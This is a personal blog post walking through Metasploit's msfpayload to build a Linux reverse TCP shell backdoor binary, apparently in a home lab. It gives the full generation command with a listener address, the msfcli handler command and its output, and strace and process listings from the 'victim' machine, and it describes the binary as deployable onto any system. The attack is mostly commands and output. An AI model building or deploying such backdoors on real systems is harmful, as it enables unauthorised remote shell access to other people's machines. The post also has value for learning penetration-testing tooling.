---
categories:
  - awesome-applications
  - metasploit
tags:
  - security
  - metasploit
layout: post
title: Msfpayload Greatness - Creating a Simple Backdoor
created: 1409461080
---

So it's Saturday night, I don't have a date, nor am I drunk, so lets hack!

I'm not a Metasploit ninja what so ever, and the basic MSF knowledge I have is playing with it via `msfconsole`. I've heard of `msfpayload` and its capabilities, but I've never gotten a chance to play around with it until now. Holyshit, `msfpayload` is freaking awesome! Msfpayload essentially gives you the ability to export payloads into a standalone binary executable or dll and yet even cooler, as well as the actual raw shellcode representation in either C, C#, Perl, Ruby, JS, VBA, and Python.

To illustrate its greatness, its dead simple to create a standalone backdoor that you can deploy onto any system.  

Syntax is straight forward:

```bash
root@kali01:~# msfpayload -h

    Usage: /opt/metasploit/apps/pro/msf3/msfpayload [< options >]  < payload > [var=val] <[S]ummary|C|Cs[H]arp|[P]erl|Rub[Y]|[R]aw|[J]s|e[X]e|[D]ll|[V]BA|[W]ar|Pytho[N]>

OPTIONS:

    -h       Help banner
    -l       List available payloads
```

So lets create our self a simple tcp reverse shell. Communicating with the payload is practically identical as with `msfconsole`, in this case the `LHOST`, listening parameter is required. X, parameter is saying that we want a binary executable, and we save the file as `cool_shit`.

```bash
root@kali01:~# msfpayload linux/x86/shell/reverse_tcp LHOST=192.168.56.102 X > cool_shit
Created by msfpayload (http://www.metasploit.com).
Payload: linux/x86/shell/reverse_tcp
 Length: 71
Options: {"LHOST"=>"192.168.56.102"}
```

At this point, assuming the backdoor has been copied to the victim's system. The attacking computer can initiate the payload.  

```bash
root@kali01:~# msfcli multi/handler payload=linux/x86/shell/reverse_tcp LHOST=192.168.56.102 E
[*] Initializing modules...
[-] Failed to connect to the database: could not connect to server: Connection refused
	Is the server running on host "localhost" (::1) and accepting
	TCP/IP connections on port 5432?
could not connect to server: Connection refused
	Is the server running on host "localhost" (127.0.0.1) and accepting
	TCP/IP connections on port 5432?

payload => linux/x86/shell/reverse_tcp
LHOST => 192.168.56.102
[*] Started reverse handler on 192.168.56.102:4444
[*] Starting the payload handler...
```

From here the attacker waits, until the backdoor is run on the victims computer.

<img src="/assets/awesome-applications/reverse_shell.png" alt="Reverse TCP Shell" title="Reverse Shell">

Theirs a few gotchas and quirks that I noticed. The payload handler has to initiated on the attacker's system prior to running the backdoor, other wise the reverse shell backdoor will crash.

```bash
tony@alpha-vm:~$ ./cool_shit
Segmentation fault (core dumped)
```

(Detailed strace output)
```bash
xecve("./cool_shit", ["./cool_shit"], [/* 20 vars */]) = 0
[ Process PID=4859 runs in 32 bit mode. ]
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.56.102")}, 102) = -1 ECONNREFUSED (Connection refused)
syscall_4294967165(0xffaa1000, 0x1000, 0x7, 0, 0x3, 0) = -1 (errno 38)
syscall_4294967043(0x3, 0xffaa15b8, 0xffff0cff, 0, 0x3, 0) = -1 (errno 38)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x66ffaa} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

The second quirk was that I wasn't able to properly get a native shell session, but rather just limited to session's commands

<img src="/assets/awesome-applications/shell_error.png" alt="Reverse TCP Shell" title="Reverse Shell">

Even the process itself on the victim's system gave /bin//sh instead of /bin/sh ....

```bash
root      4227  0.0  0.1  61364  3052 ?        Ss   22:53   0:00 /usr/sbin/sshd -D
root      4323  0.0  0.2 109784  4280 ?        Ss   22:53   0:00  \_ sshd: tony [priv]
tony      4359  0.0  0.0 109932  1948 ?        S    22:53   0:00  |   \_ sshd: tony@pts/1
tony      4360  0.0  0.1  26908  4024 pts/1    Ss   22:53   0:00  |       \_ -bash
tony      4874  0.0  0.0   4444   652 pts/1    S+   23:48   0:00  |           \_ /bin//sh
```

I haven't done additional research on this quirk, it may just be some mistake on my end.

Obviously, malicious backdoors are a lot more sophisticated than this, however the fact that the Metasploit Framework lets us easily create them, as proof-of-concept this is truly amazing.

Reference:

* <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload" target="_blank">http://www.offensive-security.com/metasploit-unleashed/Msfpayload</a>
